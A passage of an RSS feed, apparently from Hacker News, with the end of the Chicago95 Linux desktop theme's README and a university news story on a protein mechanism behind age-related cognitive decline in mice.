<li>gtk2-engines-pixbuf (Recommended for GTK2 applications)</li>
<li>The xfce4-panel-profiles package</li>
<li>A Window compositor</li>
</ul>
<p dir="auto">(If your are using an older desktop that uses GTK3.18, you can use <a href="https://github.com/EMH-Mark-I/Chicago95-Custom-XUbuntu-16.04-">this forked version of the theme.</a>)</p>
<hr>
<h2 tabindex="-1" dir="auto">Documentation</h2>
<p dir="auto"><a href="https://github.com/grassmunk/Chicago95/blob/master/INSTALL.md">Click here</a> for Chicago95 documentation and extra features.</p>
<hr>
<h2 tabindex="-1" dir="auto">Installation</h2>
<h3 tabindex="-1" dir="auto">Packages:</h3>
<table>
<thead>
<tr>
<th>Distro</th>
<th>Package Name/Link</th>
</tr>
</thead>
<tbody>
<tr>
<td>Debian 9</td>
<td><a href="https://software.opensuse.org//download.html?project=home%3Abgstack15%3AChicago95&amp;package=chicago95-theme-all" rel="nofollow">obs-repo</a></td>
</tr>
<tr>
<td>Debian 10</td>
<td><a href="https://software.opensuse.org//download.html?project=home%3Abgstack15%3AChicago95&amp;package=chicago95-theme-all" rel="nofollow">obs-repo</a></td>
</tr>
<tr>
<td>Debian Testing/Unstable</td>
<td><a href="https://software.opensuse.org//download.html?project=home%3Abgstack15%3AChicago95&amp;package=chicago95-theme-all" rel="nofollow">obs-repo</a></td>
</tr>
<tr>
<td>Ubuntu 18.04 - 20.04</td>
<td><a href="https://software.opensuse.org//download.html?project=home%3Abgstack15%3AChicago95&amp;package=chicago95-theme-all" rel="nofollow">obs-repo</a></td>
</tr>
</tbody>
</table>
<h3 tabindex="-1" dir="auto">Manual installation and setup instructions:</h3>
<p dir="auto"><a href="https://github.com/grassmunk/Chicago95/blob/master/INSTALL.md">Click here</a> for install steps.</p>
<h3 tabindex="-1" dir="auto">Install a Microsoft Windows Plus! theme:</h3>
<p dir="auto"><a href="https://github.com/grassmunk/Chicago95/blob/master/Plus/README.MD">Click here</a> for installing custom themes.</p>
<h3 tabindex="-1" dir="auto">Install the Plymouth boot splash theme:</h3>
<p dir="auto"><a href="https://github.com/grassmunk/Chicago95/blob/master/Plymouth">Click here</a> for install steps.</p>
<h3 tabindex="-1" dir="auto">Install the LibreOffice icon theme:</h3>
<p dir="auto"><a href="https://github.com/grassmunk/Chicago95/blob/master/Extras/libreoffice-chicago95-iconset/README.md">Click here</a> for installing the LibreOffice Chicago95 icon theme.</p>
<hr>
<h2 tabindex="-1" dir="auto">Miscellaneous</h2>
<h3 tabindex="-1" dir="auto">KDE Support (experimental):</h3>
<ul dir="auto">
<li>SDDM Logon Manager:: Click <code>Install from file...</code> in Loggin Screen (SDDM) manager. Select <code>SDDM/Chicago95.tar.gz</code> to install the theme.</li>
<li>Splash Screen: <code>plasmapkg2 -t lookandfeel -i KDE/Splash/chicago95.splashscreen</code></li>
</ul>
<h3 tabindex="-1" dir="auto">Screenshots:</h3>
<p dir="auto"><a href="https://github.com/grassmunk/Chicago95/blob/master/Screenshots/SCREENSHOTS.md">Click here to view screenshots</a></p>
<h3 tabindex="-1" dir="auto">IRC server:</h3>
<p dir="auto"><a href="https://web.emhmki.org:8443/" rel="nofollow">Click here</a> to connect to the IRC server. Please read server rules and be kind.</p>
<hr>
<h3 tabindex="-1" dir="auto">Code and license</h3>
<p dir="auto">License: GPL-3.0+/MIT</p>
</article>
          </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Scientists may have found mechanism behind cognitive decline in aging (318 pts)]]></title>
            <link>https://news.cuanschutz.edu/news-stories/scientists-may-have-found-mechanism-behind-cognitive-decline-in-aging</link>
            <guid>36929090</guid>
            <pubDate>Sun, 30 Jul 2023 08:28:00 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://news.cuanschutz.edu/news-stories/scientists-may-have-found-mechanism-behind-cognitive-decline-in-aging">https://news.cuanschutz.edu/news-stories/scientists-may-have-found-mechanism-behind-cognitive-decline-in-aging</a>, See on <a href="https://news.ycombinator.com/item?id=36929090">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="hs_cos_wrapper_module_151456960811572" data-hs-cos-general-type="widget" data-hs-cos-type="module" data-widget-type="custom_widget" data-x="0" data-w="12">
<p><span id="hs_cos_wrapper_post_body" data-hs-cos-general-type="meta_field" data-hs-cos-type="rich_text"><p>Scientists at the University of Colorado Anschutz Medical Campus have discovered what they believe to be the central mechanism behind cognitive decline associated with normal aging.</p>
<!--more-->
<p>“The mechanism involves the mis-regulation of a brain protein known as CaMKII which is crucial for memory and learning,” said the study’s co-senior author <a href="https://medschool.cuanschutz.edu/pharmacology/faculty/primary-faculty/ulli-bayer-phd" rel="noopener">Ulli Bayer,</a> PhD, professor of pharmacology at the <a href="https://medschool.cuanschutz.edu/" rel="noopener"><span>University of Colorado School of Medicine</span></a>. “This study directly suggests specific pharmacological treatment strategies.”</p>
<p>The <a href="https://www.science.org/doi/10.1126/scisignal.ade5892" rel="noopener">study was published</a> today in the journal `Science Signaling.’</p>
<p>Researchers using mouse models found that altering the CaMKII brain protein caused similar cognitive effects as those that happen through normal aging.</p>
<p>Bayer said that aging in mice and humans both decrease a process known as S-nitrosylation, the modification of a specific brain proteins including CaMKII.</p>
<p>“The current study now shows a decrease in this modification of CaMKII is sufficient to cause impairments in synaptic plasticity and in memory that are similar in aging,” Bayer said.</p>
<p>Normal aging reduces the amount of nitric oxide in the body. That in turn reduces nitrosylation which decreases memory and learning ability, the study said.</p>
<p>Bayer said the new research opens the way toward developing drugs and other therapeutic interventions that could normalize the nitrosylation of the protein. He said that holds out the possibility of treating or staving off normal cognitive decline for an unknown period of time.</p>
<p>He pointed out that this would only work in normal age-related cognitive decline, not the decline seen in Alzheimer’s disease and dementia.</p>
<p>“We know this protein can be targeted,” Bayer said. “And we think it could be done pharmacologically. That is the next logical step.”</p></span>
</p>
</div></div>]]></description>
        </item>
    </channel>
</rss>